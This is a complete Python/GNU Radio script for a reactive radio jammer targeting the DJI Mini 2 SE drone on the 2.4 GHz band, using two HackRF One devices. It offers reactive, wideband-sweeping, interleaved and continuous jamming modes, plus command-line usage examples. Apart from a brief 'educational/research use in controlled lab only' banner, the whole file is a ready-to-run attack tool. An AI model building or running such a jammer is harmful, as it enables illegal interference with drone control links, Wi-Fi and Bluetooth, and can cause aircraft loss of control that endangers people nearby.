#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reactive Jammer for DJI Mini 2 SE on 2.4GHz Band
Uses dual HackRF One devices:
  - HackRF #0: Continuous receiver (spectrum monitor)
  - HackRF #1: Jammer (transmits when activity detected)

For educational/research use in controlled lab environment only.
"""

import sys
import time
import yaml
import queue
import signal
import osmosdr
import threading
import numpy as np
from gnuradio.fft import window
from gnuradio.filter import firdes
from gnuradio import gr, blocks, analog, fft, filter

# ============================================================================
# Configuration
# ============================================================================

class Config:
    """Configuration container with defaults for DJI Mini 2 SE jamming"""
    
    # HackRF device serials (leave empty to use hackrf=0, hackrf=1)
    RX_DEVICE = "hackrf=0"  # Receiver
    TX_DEVICE = "hackrf=1"  # Jammer
    
    # Frequency settings for 2.4GHz band (DJI uses 2.400-2.4835 GHz)
    CENTER_FREQ = 2.44e9      # Center of 2.4GHz band
    SAMPLE_RATE = 20e6        # 20 MHz sample rate (covers ~20MHz of spectrum)
    BANDWIDTH = 20e6          # Full bandwidth
    
    # For wideband coverage, we can sweep or use multiple center frequencies
    FREQ_START = 2.400e9      # Start of 2.4GHz band
    FREQ_END = 2.4835e9       # End of 2.4GHz band
    FREQ_STEP = 20e6          # Step size for sweeping
    
    # Detection settings
    FFT_SIZE = 1024           # FFT size for spectrum analysis
    DETECTION_INTERVAL = 0.02 # How often to check for activity (20ms)
    
    # Noise floor calibration
    CALIBRATION_TIME = 3.0    # Seconds to measure noise floor
    THRESHOLD_MARGIN_DB = 6   # dB above noise floor to trigger
    
    # Jammer settings
    TX_POWER = 10             # dBm
    WAVEFORM = 3              # 1=tone, 2=chirp, 3=gaussian noise
    JAM_DURATION = 0.1        # Minimum jam duration per trigger
    
    # Timing
    TOTAL_DURATION = 300      # Total runtime in seconds


# ============================================================================
# Spectrum Monitor (Continuous RX)
# ============================================================================

class SpectrumMonitor(gr.top_block):
    """
    Continuous spectrum monitor using HackRF.
    Runs FFT and pushes magnitude data to a callback.
    """
    
    def __init__(self, device, center_freq, sample_rate, bandwidth, 
                 fft_size, callback):
        gr.top_block.__init__(self, "Spectrum Monitor")
        
        self.callback = callback
        self.fft_size = fft_size
        self.sample_rate = sample_rate
        self.center_freq = center_freq
        
        # Source: HackRF receiver
        self.source = osmosdr.source(args=device)
        self.source.set_sample_rate(sample_rate)
        self.source.set_center_freq(center_freq, 0)
        self.source.set_freq_corr(0, 0)
        self.source.set_gain(0, 0)          # RF gain
        self.source.set_if_gain(32, 0)      # IF gain - increased for sensitivity
        self.source.set_bb_gain(20, 0)      # Baseband gain
        self.source.set_bandwidth(bandwidth, 0)
        
        # Stream to vector for FFT
        self.s2v = blocks.stream_to_vector(gr.sizeof_gr_complex, fft_size)
        
        # FFT
        self.fft_block = fft.fft_vcc(fft_size, True, 
                                      window.blackmanharris(fft_size), 
                                      True)
        
        # Complex to magnitude squared
        self.c2mag = blocks.complex_to_mag_squared(fft_size)
        
        # Probe to get data
        self.probe = blocks.probe_signal_vf(fft_size)
        
        # Connect: source -> s2v -> fft -> mag -> probe
        self.connect(self.source, self.s2v, self.fft_block, 
                     self.c2mag, self.probe)
    
    def get_spectrum(self):
        """Get current FFT magnitude spectrum"""
        return np.array(self.probe.level())
    
    def set_center_freq(self, freq):
        """Change center frequency"""
        self.center_freq = freq
        self.source.set_center_freq(freq, 0)


# ============================================================================
# Jammer Transmitter
# ============================================================================

class JammerTX(gr.top_block):
    """
    Jammer transmitter using HackRF.
    Can be started/stopped dynamically.
    """
    
    def __init__(self, device, center_freq, sample_rate, bandwidth,
                 waveform, power):
        gr.top_block.__init__(self, "Jammer TX")
        
        self.sample_rate = sample_rate
        self.center_freq = center_freq
        self.is_running = False
        
        # Calculate gains
        rf_gain, if_gain = self._calculate_gains(power)
        
        # Sink: HackRF transmitter
        self.sink = osmosdr.sink(args=device)
        self.sink.set_sample_rate(sample_rate)
        self.sink.set_center_freq(center_freq, 0)
        self.sink.set_freq_corr(0, 0)
        self.sink.set_gain(rf_gain, 0)
        self.sink.set_if_gain(if_gain, 0)
        self.sink.set_bb_gain(20, 0)
        self.sink.set_bandwidth(bandwidth, 0)
        
        # Source based on waveform type
        if waveform == 1:
            # Single tone - less effective but simple
            self.source = analog.sig_source_c(sample_rate, analog.GR_SIN_WAVE, 
                                               1e6, 1.0, 0)
        elif waveform == 2:
            # Chirp/Swept sine - better for FHSS
            # Create swept frequency using FM
            sweep_rate = 1e3  # Hz sweep rate
            sweep_freq = sample_rate / 4  # Sweep across bandwidth
            mod_signal = analog.sig_source_f(sample_rate, analog.GR_SAW_WAVE,
                                              sweep_rate, sweep_freq, 0)
            freq_mod = analog.frequency_modulator_fc(2 * np.pi / sample_rate)
            self.source = mod_signal
            self.freq_mod = freq_mod
            self.connect(self.source, self.freq_mod, self.sink)
            return
        else:  # waveform == 3 or default
            # Wideband Gaussian noise - most effective for jamming
            self.source = analog.noise_source_c(analog.GR_GAUSSIAN, 1.0, 0)
        
        # Connect source to sink
        self.connect(self.source, self.sink)
    
    def _calculate_gains(self, power):
        """Calculate RF and IF gains from desired power level"""
        if -40 <= power <= 5:
            rf_gain = 0
            if power < -5:
                if_gain = power + 40
            elif power <= 2:
                if_gain = power + 41
            else:
                if_gain = power + 42
        elif power <= 14:
            rf_gain = 14
            if_gain = power + 33  # Adjusted for HackRF
        else:
            print(f"Warning: Power {power} dBm out of range, clamping")
            rf_gain = 14
            if_gain = 47
        return rf_gain, if_gain
    
    def set_center_freq(self, freq):
        """Change center frequency dynamically"""
        self.center_freq = freq
        self.sink.set_center_freq(freq, 0)


# ============================================================================
# Reactive Jammer Controller
# ============================================================================

class ReactiveJammer:
    """
    Main controller that coordinates RX monitoring and TX jamming.
    """
    
    def __init__(self, config):
        self.config = config
        self.noise_floor = None
        self.threshold = None
        self.running = False
        self.jamming_active = False
        
        # Lock to prevent detection during jamming (self-interference)
        self.detection_lock = threading.Lock()
        self.suppress_detection = False
        
        self.monitor = None
        self.jammer = None
        
        self.detection_queue = queue.Queue()
        self.stats = {
            'detections': 0,
            'jam_activations': 0,
            'total_jam_time': 0
        }
        
        # Current frequency for sweeping mode
        self.current_freq = config.CENTER_FREQ
        
    def calibrate_noise_floor(self):
        """
        Measure noise floor before starting operation.
        Should be done with drone OFF.
        """
        print("\n" + "="*60)
        print("NOISE FLOOR CALIBRATION")
        print("="*60)
        print(f"Measuring for {self.config.CALIBRATION_TIME} seconds...")
        print(">>> ENSURE DRONE IS OFF <<<")
        print()
        
        # Create temporary monitor for calibration
        cal_monitor = SpectrumMonitor(
            device=self.config.RX_DEVICE,
            center_freq=self.config.CENTER_FREQ,
            sample_rate=self.config.SAMPLE_RATE,
            bandwidth=self.config.BANDWIDTH,
            fft_size=self.config.FFT_SIZE,
            callback=None
        )
        
        cal_monitor.start()
        
        # Collect samples
        samples = []
        start_time = time.time()
        while time.time() - start_time < self.config.CALIBRATION_TIME:
            time.sleep(0.05)
            spectrum = cal_monitor.get_spectrum()
            if len(spectrum) > 0 and np.any(spectrum > 0):
                samples.append(spectrum)
        
        cal_monitor.stop()
        cal_monitor.wait()
        
        if not samples:
            print("ERROR: No samples collected during calibration!")
            return False
        
        # Calculate noise floor statistics
        all_samples = np.array(samples)
        
        # Use median to be robust against outliers
        self.noise_floor = np.median(all_samples)
        noise_floor_db = 10 * np.log10(self.noise_floor + 1e-12)
        
        # Calculate threshold
        threshold_db = noise_floor_db + self.config.THRESHOLD_MARGIN_DB
        self.threshold = 10 ** (threshold_db / 10)
        
        # Also calculate per-bin noise floor for smarter detection
        self.noise_floor_per_bin = np.median(all_samples, axis=0)
        
        print(f"Noise floor (linear):   {self.noise_floor:.2e}")
        print(f"Noise floor (dB):       {noise_floor_db:.1f} dB")
        print(f"Detection threshold:    {self.threshold:.2e}")
        print(f"Threshold (dB):         {threshold_db:.1f} dB")
        print(f"Margin above noise:     {self.config.THRESHOLD_MARGIN_DB} dB")
        print("="*60 + "\n")
        
        return True
    
    def detect_activity(self, spectrum):
        """
        Detect drone activity in spectrum.
        Returns True if activity detected.
        """
        if spectrum is None or len(spectrum) == 0:
            return False
        
        # Method 1: Simple mean power threshold
        mean_power = np.mean(spectrum)
        
        # Method 2: Peak detection (useful for narrowband signals)
        peak_power = np.max(spectrum)
        
        # Method 3: Compare against per-bin noise floor
        if self.noise_floor_per_bin is not None:
            excess_power = spectrum - self.noise_floor_per_bin
            num_active_bins = np.sum(excess_power > self.threshold)
            active_ratio = num_active_bins / len(spectrum)
        else:
            active_ratio = 0
        
        # Trigger if any detection method fires
        # - Mean power significantly above noise
        # - Peak power very high
        # - Multiple bins active
        
        mean_triggered = mean_power > self.threshold
        peak_triggered = peak_power > (self.threshold * 10)
        bins_triggered = active_ratio > 0.05  # >5% of bins active
        
        detected = mean_triggered or peak_triggered or bins_triggered
        
        if detected:
            self.stats['detections'] += 1
            if self.stats['detections'] % 10 == 1:  # Print every 10th detection
                print(f"[DETECT] mean={mean_power:.2e} peak={peak_power:.2e} "
                      f"active_bins={active_ratio*100:.1f}%")
        
        return detected
    
    def monitoring_loop(self):
        """
        Main monitoring loop - runs in background thread.
        Continuously checks spectrum and signals jammer when activity detected.
        """
        print("[RX] Monitoring started")
        
        last_detection_time = 0
        detection_holdoff = 0.05  # Minimum time between detections
        
        while self.running:
            try:
                # Skip detection if we're currently jamming (avoid self-interference)
                if self.suppress_detection:
                    time.sleep(self.config.DETECTION_INTERVAL)
                    continue
                
                # Get current spectrum
                spectrum = self.monitor.get_spectrum()
                
                # Check for activity
                if self.detect_activity(spectrum):
                    current_time = time.time()
                    if current_time - last_detection_time > detection_holdoff:
                        self.detection_queue.put(('ACTIVITY', self.current_freq))
                        last_detection_time = current_time
                
                # Small sleep to prevent CPU spinning
                time.sleep(self.config.DETECTION_INTERVAL)
                
            except Exception as e:
                print(f"[RX] Error: {e}")
                time.sleep(0.1)
        
        print("[RX] Monitoring stopped")
    
    def jamming_loop(self):
        """
        Jamming control loop - runs in background thread.
        Activates jammer when detection queue has activity.
        """
        print("[TX] Jamming controller started")
        
        jam_start_time = None
        jam_until = 0
        
        while self.running:
            try:
                # Check for detection events (non-blocking)
                try:
                    event, freq = self.detection_queue.get(timeout=0.01)
                    if event == 'ACTIVITY':
                        # Extend jamming time
                        jam_until = time.time() + self.config.JAM_DURATION
                        
                        # Start jamming if not already
                        if not self.jamming_active:
                            print(f"[TX] >>> JAMMING ACTIVE @ {freq/1e6:.1f} MHz <<<")
                            
                            # Suppress detection to avoid self-interference
                            self.suppress_detection = True
                            
                            self.jammer.set_center_freq(freq)
                            self.jammer.start()
                            self.jamming_active = True
                            self.stats['jam_activations'] += 1
                            jam_start_time = time.time()
                        
                except queue.Empty:
                    pass
                
                # Check if we should stop jamming
                if self.jamming_active and time.time() > jam_until:
                    print("[TX] Jamming stopped (no activity)")
                    self.jammer.stop()
                    self.jammer.wait()
                    self.jamming_active = False
                    
                    if jam_start_time:
                        self.stats['total_jam_time'] += time.time() - jam_start_time
                        jam_start_time = None
                    
                    # Recreate jammer flowgraph (HackRF requires this)
                    self._init_jammer()
                    
                    # Small delay before re-enabling detection
                    # Allows receiver to settle after TX stops
                    time.sleep(0.05)
                    self.suppress_detection = False
                
            except Exception as e:
                print(f"[TX] Error: {e}")
                time.sleep(0.1)
        
        print("[TX] Jamming controller stopped")
    
    def _init_monitor(self):
        """Initialize the spectrum monitor"""
        self.monitor = SpectrumMonitor(
            device=self.config.RX_DEVICE,
            center_freq=self.current_freq,
            sample_rate=self.config.SAMPLE_RATE,
            bandwidth=self.config.BANDWIDTH,
            fft_size=self.config.FFT_SIZE,
            callback=None
        )
    
    def _init_jammer(self):
        """Initialize the jammer transmitter"""
        self.jammer = JammerTX(
            device=self.config.TX_DEVICE,
            center_freq=self.current_freq,
            sample_rate=self.config.SAMPLE_RATE,
            bandwidth=self.config.BANDWIDTH,
            waveform=self.config.WAVEFORM,
            power=self.config.TX_POWER
        )
    
    def start(self):
        """Start the reactive jammer system"""
        print("\n" + "="*60)
        print("STARTING REACTIVE JAMMER")
        print("="*60)
        print(f"RX Device: {self.config.RX_DEVICE}")
        print(f"TX Device: {self.config.TX_DEVICE}")
        print(f"Center Frequency: {self.config.CENTER_FREQ/1e6:.1f} MHz")
        print(f"Bandwidth: {self.config.BANDWIDTH/1e6:.1f} MHz")
        print(f"TX Power: {self.config.TX_POWER} dBm")
        print(f"Duration: {self.config.TOTAL_DURATION} seconds")
        print("="*60 + "\n")
        
        # Initialize components
        self._init_monitor()
        self._init_jammer()
        
        # Start monitor
        self.running = True
        self.monitor.start()
        
        # Start monitoring thread
        self.monitor_thread = threading.Thread(
            target=self.monitoring_loop, 
            daemon=True,
            name="MonitorThread"
        )
        self.monitor_thread.start()
        
        # Start jamming control thread
        self.jammer_thread = threading.Thread(
            target=self.jamming_loop,
            daemon=True,
            name="JammerThread"
        )
        self.jammer_thread.start()
        
        print("[SYSTEM] Reactive jammer active - monitoring for drone signals\n")
    
    def stop(self):
        """Stop the reactive jammer system"""
        print("\n[SYSTEM] Stopping reactive jammer...")
        
        self.running = False
        
        # Stop jammer if active
        if self.jamming_active:
            try:
                self.jammer.stop()
                self.jammer.wait()
            except:
                pass
        
        # Stop monitor
        try:
            self.monitor.stop()
            self.monitor.wait()
        except:
            pass
        
        # Wait for threads
        if hasattr(self, 'monitor_thread'):
            self.monitor_thread.join(timeout=2)
        if hasattr(self, 'jammer_thread'):
            self.jammer_thread.join(timeout=2)
        
        # Print statistics
        print("\n" + "="*60)
        print("SESSION STATISTICS")
        print("="*60)
        print(f"Total detections:       {self.stats['detections']}")
        print(f"Jammer activations:     {self.stats['jam_activations']}")
        print(f"Total jamming time:     {self.stats['total_jam_time']:.1f} seconds")
        print("="*60 + "\n")
    
    def run(self, duration=None):
        """Run for specified duration"""
        if duration is None:
            duration = self.config.TOTAL_DURATION
        
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                
                # Status update every 10 seconds
                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                    status = "JAMMING" if self.jamming_active else "monitoring"
                    print(f"[STATUS] {int(elapsed)}s elapsed - {status} - "
                          f"detections: {self.stats['detections']}")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[SYSTEM] Interrupted by user")


# ============================================================================
# Wideband Sweeping Reactive Jammer
# ============================================================================

class WidebandReactiveJammer(ReactiveJammer):
    """
    Enhanced jammer that sweeps across the 2.4GHz band.
    Better for catching frequency-hopping protocols like DJI OcuSync.
    """
    
    def __init__(self, config):
        super().__init__(config)
        
        # Calculate sweep frequencies
        self.sweep_freqs = []
        freq = config.FREQ_START + config.SAMPLE_RATE / 2
        while freq < config.FREQ_END:
            self.sweep_freqs.append(freq)
            freq += config.FREQ_STEP * 0.8  # 20% overlap
        
        print(f"Sweep frequencies: {[f/1e6 for f in self.sweep_freqs]} MHz")
        self.current_sweep_idx = 0
    
    def monitoring_loop(self):
        """
        Enhanced monitoring loop with frequency sweeping.
        """
        print("[RX] Wideband monitoring started")
        
        last_detection_time = 0
        detection_holdoff = 0.02
        sweep_interval = 0.05  # Time on each frequency
        last_sweep_time = time.time()
        
        while self.running:
            try:
                # Sweep to next frequency periodically
                current_time = time.time()
                if current_time - last_sweep_time > sweep_interval:
                    self.current_sweep_idx = (self.current_sweep_idx + 1) % len(self.sweep_freqs)
                    self.current_freq = self.sweep_freqs[self.current_sweep_idx]
                    self.monitor.set_center_freq(self.current_freq)
                    last_sweep_time = current_time
                
                # Get current spectrum
                spectrum = self.monitor.get_spectrum()
                
                # Check for activity
                if self.detect_activity(spectrum):
                    if current_time - last_detection_time > detection_holdoff:
                        self.detection_queue.put(('ACTIVITY', self.current_freq))
                        last_detection_time = current_time
                
                time.sleep(self.config.DETECTION_INTERVAL)
                
            except Exception as e:
                print(f"[RX] Error: {e}")
                time.sleep(0.1)
        
        print("[RX] Wideband monitoring stopped")


# ============================================================================
# Continuous Wideband Jammer (Alternative Mode)
# ============================================================================

class ContinuousJammer:
    """
    Simple continuous jammer that sweeps across the entire 2.4GHz band.
    More reliable against FHSS than reactive approach.
    Useful when reactive detection is difficult or drone signal is weak.
    """
    
    def __init__(self, config):
        self.config = config
        self.running = False
        self.jammer = None
        
        # Calculate sweep frequencies to cover entire band
        self.sweep_freqs = []
        freq = config.FREQ_START + config.SAMPLE_RATE / 2
        while freq < config.FREQ_END:
            self.sweep_freqs.append(freq)
            freq += config.FREQ_STEP * 0.7  # 30% overlap for better coverage
        
        print(f"Will sweep across {len(self.sweep_freqs)} frequencies")
        print(f"Coverage: {config.FREQ_START/1e6:.1f} - {config.FREQ_END/1e6:.1f} MHz")
    
    def start(self):
        """Start continuous jamming with frequency sweeping"""
        print("\n" + "="*60)
        print("CONTINUOUS WIDEBAND JAMMER")
        print("="*60)
        print(f"TX Device: {self.config.TX_DEVICE}")
        print(f"Power: {self.config.TX_POWER} dBm")
        print(f"Sweep range: {self.config.FREQ_START/1e6:.1f} - {self.config.FREQ_END/1e6:.1f} MHz")
        print(f"Duration: {self.config.TOTAL_DURATION} seconds")
        print("="*60 + "\n")
        
        self.running = True
    
    def run(self, duration=None):
        """Run continuous jamming with frequency hopping"""
        if duration is None:
            duration = self.config.TOTAL_DURATION
        
        start_time = time.time()
        current_idx = 0
        dwell_time = 0.05  # 50ms per frequency
        
        print("[TX] Starting continuous wideband jamming...")
        
        try:
            while self.running and (time.time() - start_time) < duration:
                # Get current frequency
                freq = self.sweep_freqs[current_idx]
                
                # Create and start jammer at this frequency
                self.jammer = JammerTX(
                    device=self.config.TX_DEVICE,
                    center_freq=freq,
                    sample_rate=self.config.SAMPLE_RATE,
                    bandwidth=self.config.BANDWIDTH,
                    waveform=self.config.WAVEFORM,
                    power=self.config.TX_POWER
                )
                
                self.jammer.start()
                time.sleep(dwell_time)
                self.jammer.stop()
                self.jammer.wait()
                
                # Move to next frequency
                current_idx = (current_idx + 1) % len(self.sweep_freqs)
                
                # Status update
                elapsed = time.time() - start_time
                if int(elapsed) % 5 == 0:
                    print(f"[TX] {int(elapsed)}s - Jamming @ {freq/1e6:.1f} MHz")
                    
        except KeyboardInterrupt:
            print("\n[SYSTEM] Interrupted by user")
        
        print("[TX] Continuous jamming stopped")
    
    def stop(self):
        """Stop jamming"""
        self.running = False
        if self.jammer:
            try:
                self.jammer.stop()
                self.jammer.wait()
            except:
                pass


# ============================================================================
# Fast Interleaved Reactive Jammer
# ============================================================================

class InterleavedReactiveJammer:
    """
    Fast interleaved sensing and jamming using both HackRFs.
    
    Timing pattern:
    - Sense for 20ms
    - If activity: jam for 50ms at detected frequency
    - Repeat
    
    This catches frequency-hopping better by continuously tracking.
    """
    
    def __init__(self, config):
        self.config = config
        self.noise_floor = None
        self.threshold = None
        self.running = False
        
        self.stats = {
            'cycles': 0,
            'detections': 0,
            'jams': 0
        }
        
        # Timing parameters (seconds)
        self.sense_time = 0.02    # 20ms sensing
        self.jam_time = 0.05      # 50ms jamming when detected
        
        # Current monitoring frequency
        self.current_freq = config.CENTER_FREQ
        
        # Sweep frequencies
        self.sweep_freqs = []
        freq = config.FREQ_START + config.SAMPLE_RATE / 2
        while freq < config.FREQ_END:
            self.sweep_freqs.append(freq)
            freq += config.FREQ_STEP * 0.8
        self.sweep_idx = 0
    
    def calibrate_noise_floor(self):
        """Quick noise floor calibration"""
        print("\n[CAL] Measuring noise floor...")
        
        samples = []
        
        for freq in self.sweep_freqs[:3]:  # Sample first 3 frequencies
            monitor = SpectrumMonitor(
                device=self.config.RX_DEVICE,
                center_freq=freq,
                sample_rate=self.config.SAMPLE_RATE,
                bandwidth=self.config.BANDWIDTH,
                fft_size=self.config.FFT_SIZE,
                callback=None
            )
            
            monitor.start()
            time.sleep(0.5)
            
            for _ in range(10):
                spectrum = monitor.get_spectrum()
                if len(spectrum) > 0:
                    samples.append(np.mean(spectrum))
                time.sleep(0.02)
            
            monitor.stop()
            monitor.wait()
        
        if samples:
            self.noise_floor = np.median(samples)
            noise_db = 10 * np.log10(self.noise_floor + 1e-12)
            threshold_db = noise_db + self.config.THRESHOLD_MARGIN_DB
            self.threshold = 10 ** (threshold_db / 10)
            
            print(f"[CAL] Noise floor: {noise_db:.1f} dB")
            print(f"[CAL] Threshold: {threshold_db:.1f} dB")
            return True
        
        return False
    
    def run(self, duration=None):
        """Run interleaved sense-jam cycle"""
        if duration is None:
            duration = self.config.TOTAL_DURATION
        
        print("\n" + "="*60)
        print("INTERLEAVED REACTIVE JAMMER")
        print("="*60)
        
        self.running = True
        start_time = time.time()
        
        try:
            while self.running and (time.time() - start_time) < duration:
                self.stats['cycles'] += 1
                
                # Get current frequency
                self.current_freq = self.sweep_freqs[self.sweep_idx]
                
                # SENSE PHASE
                monitor = SpectrumMonitor(
                    device=self.config.RX_DEVICE,
                    center_freq=self.current_freq,
                    sample_rate=self.config.SAMPLE_RATE,
                    bandwidth=self.config.BANDWIDTH,
                    fft_size=self.config.FFT_SIZE,
                    callback=None
                )
                
                monitor.start()
                time.sleep(self.sense_time)
                spectrum = monitor.get_spectrum()
                monitor.stop()
                monitor.wait()
                
                # Check for activity
                activity_detected = False
                if len(spectrum) > 0:
                    mean_power = np.mean(spectrum)
                    if mean_power > self.threshold:
                        activity_detected = True
                        self.stats['detections'] += 1
                
                # JAM PHASE (only if activity detected)
                if activity_detected:
                    print(f"[!] Activity @ {self.current_freq/1e6:.1f} MHz - JAMMING")
                    self.stats['jams'] += 1
                    
                    jammer = JammerTX(
                        device=self.config.TX_DEVICE,
                        center_freq=self.current_freq,
                        sample_rate=self.config.SAMPLE_RATE,
                        bandwidth=self.config.BANDWIDTH,
                        waveform=self.config.WAVEFORM,
                        power=self.config.TX_POWER
                    )
                    
                    jammer.start()
                    time.sleep(self.jam_time)
                    jammer.stop()
                    jammer.wait()
                
                # Move to next frequency
                self.sweep_idx = (self.sweep_idx + 1) % len(self.sweep_freqs)
                
                # Status update every 100 cycles
                if self.stats['cycles'] % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"[STATUS] {int(elapsed)}s - cycles:{self.stats['cycles']} "
                          f"detections:{self.stats['detections']} jams:{self.stats['jams']}")
                    
        except KeyboardInterrupt:
            print("\n[SYSTEM] Interrupted")
        
        self.running = False
        
        print("\n" + "="*60)
        print("STATISTICS")
        print("="*60)
        print(f"Total cycles: {self.stats['cycles']}")
        print(f"Detections: {self.stats['detections']}")
        print(f"Jam activations: {self.stats['jams']}")
        print("="*60)
    
    def stop(self):
        self.running = False


# ============================================================================
# Main Entry Point
# ============================================================================

def load_config(config_file="reactive_config.yaml"):
    """Load configuration from YAML file or use defaults"""
    config = Config()
    
    try:
        with open(config_file, 'r') as f:
            yaml_config = yaml.safe_load(f)
            
            if yaml_config:
                # Map YAML config to Config object
                if 'rx_device' in yaml_config:
                    config.RX_DEVICE = yaml_config['rx_device']
                if 'tx_device' in yaml_config:
                    config.TX_DEVICE = yaml_config['tx_device']
                if 'center_freq' in yaml_config:
                    config.CENTER_FREQ = yaml_config['center_freq'] * 1e6
                if 'sample_rate' in yaml_config:
                    config.SAMPLE_RATE = yaml_config['sample_rate'] * 1e6
                if 'bandwidth' in yaml_config:
                    config.BANDWIDTH = yaml_config['bandwidth'] * 1e6
                if 'tx_power' in yaml_config:
                    config.TX_POWER = yaml_config['tx_power']
                if 'waveform' in yaml_config:
                    config.WAVEFORM = yaml_config['waveform']
                if 'threshold_margin_db' in yaml_config:
                    config.THRESHOLD_MARGIN_DB = yaml_config['threshold_margin_db']
                if 'duration' in yaml_config:
                    config.TOTAL_DURATION = yaml_config['duration']
                if 'calibration_time' in yaml_config:
                    config.CALIBRATION_TIME = yaml_config['calibration_time']
                    
            print(f"Loaded config from {config_file}")
    except FileNotFoundError:
        print(f"Config file {config_file} not found, using defaults")
    except Exception as e:
        print(f"Error loading config: {e}, using defaults")
    
    return config


def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    global jammer
    print("\n[SIGNAL] Received interrupt signal")
    if jammer:
        jammer.stop()
    sys.exit(0)


# Global reference for signal handler
jammer = None


def print_usage():
    print("""
Usage: python reactive_jammer.py [MODE] [OPTIONS]

MODES:
  --reactive, -r     Reactive jamming (default) - jam only when activity detected
  --wideband, -w     Wideband reactive - sweeps across 2.4GHz band
  --interleaved, -i  Interleaved sense/jam - fast alternating mode
  --continuous, -c   Continuous jamming - always on, sweeps entire band

OPTIONS:
  --skip-cal         Skip noise floor calibration (use defaults)
  --help, -h         Show this help message

EXAMPLES:
  python reactive_jammer.py -r              # Reactive mode (default)
  python reactive_jammer.py -w              # Wideband reactive
  python reactive_jammer.py -c              # Continuous (most reliable)
  python reactive_jammer.py -i --skip-cal   # Interleaved, skip calibration
""")


def main():
    global jammer
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║         REACTIVE RF JAMMER - DJI 2.4GHz Band                ║
    ║                                                              ║
    ║  FOR EDUCATIONAL/RESEARCH USE IN CONTROLLED LAB ONLY        ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Check for help
    if '--help' in sys.argv or '-h' in sys.argv:
        print_usage()
        sys.exit(0)
    
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Load config
    config = load_config()
    
    # Parse command line arguments
    continuous_mode = '--continuous' in sys.argv or '-c' in sys.argv
    interleaved_mode = '--interleaved' in sys.argv or '-i' in sys.argv
    wideband_mode = '--wideband' in sys.argv or '-w' in sys.argv
    skip_calibration = '--skip-cal' in sys.argv
    
    # Select jammer mode
    if continuous_mode:
        print("[MODE] Continuous wideband jamming")
        print("       (No detection - always transmitting)")
        
        input("\nPress Enter to start continuous jamming...")
        
        jammer = ContinuousJammer(config)
        jammer.start()
        jammer.run()
        jammer.stop()
        
    elif interleaved_mode:
        print("[MODE] Interleaved sense/jam")
        print("       (Fast alternating detection and jamming)")
        
        jammer = InterleavedReactiveJammer(config)
        
        if not skip_calibration:
            print("\n>>> Turn OFF the drone for calibration <<<")
            input("Press Enter when ready...")
            
            if not jammer.calibrate_noise_floor():
                print("Calibration failed!")
                sys.exit(1)
            
            print("\n>>> You can now turn ON the drone <<<")
            input("Press Enter to start...")
        else:
            jammer.noise_floor = 1e-7
            jammer.threshold = 1e-6
            print("[WARNING] Using default threshold")
        
        jammer.run()
        jammer.stop()
        
    else:
        # Reactive mode (default)
        if wideband_mode:
            print("[MODE] Wideband reactive jamming")
            jammer = WidebandReactiveJammer(config)
        else:
            print("[MODE] Single frequency reactive jamming")
            jammer = ReactiveJammer(config)
        
        # Calibrate noise floor
        if not skip_calibration:
            print("\n>>> Turn OFF the drone for noise floor calibration <<<")
            input("Press Enter when ready...")
            
            if not jammer.calibrate_noise_floor():
                print("Calibration failed!")
                sys.exit(1)
            
            print("\n>>> You can now turn ON the drone <<<")
            input("Press Enter to start jamming...")
        else:
            # Use default threshold if skipping calibration
            jammer.noise_floor = 1e-7
            jammer.threshold = 1e-6
            jammer.noise_floor_per_bin = None
            print("[WARNING] Skipping calibration - using default threshold")
        
        # Start the jammer
        jammer.start()
        
        # Run for specified duration
        jammer.run()
        
        # Cleanup
        jammer.stop()
    
    print("\nDone.")


if __name__ == "__main__":
    main()
